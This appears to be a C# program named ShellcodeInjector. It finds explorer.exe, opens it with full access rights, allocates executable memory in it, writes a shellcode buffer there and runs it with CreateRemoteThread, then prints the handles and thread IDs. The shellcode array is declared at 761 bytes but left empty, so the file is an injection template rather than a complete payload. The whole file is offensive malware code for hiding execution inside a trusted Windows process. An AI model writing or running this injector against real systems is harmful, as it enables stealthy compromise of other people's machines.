using System;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace ShellcodeInjector 
{
    class Program
    {
    #region
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
#endregion

    static void Main(string[] args)

        {
         Process[] localByName = Process.GetProcessesByName("explorer");


        IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id); //Explorer.exe
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        
            byte[] buf = new byte[761] {
 };

            IntPtr outSize;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr idthread;
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out idthread);

            Console.WriteLine("The process ID of explorer.exe is: " + localByName[0].Id);
            Console.WriteLine("The process handle of explorer.exe is: " + hProcess);
            Console.WriteLine("The address space of our shellcode is: " + addr);
            Console.WriteLine("The thread ID of our shellcode is: " + idthread);
            Console.WriteLine("The thread handle is: " + hThread);
            Console.ReadLine();
        }

    }
}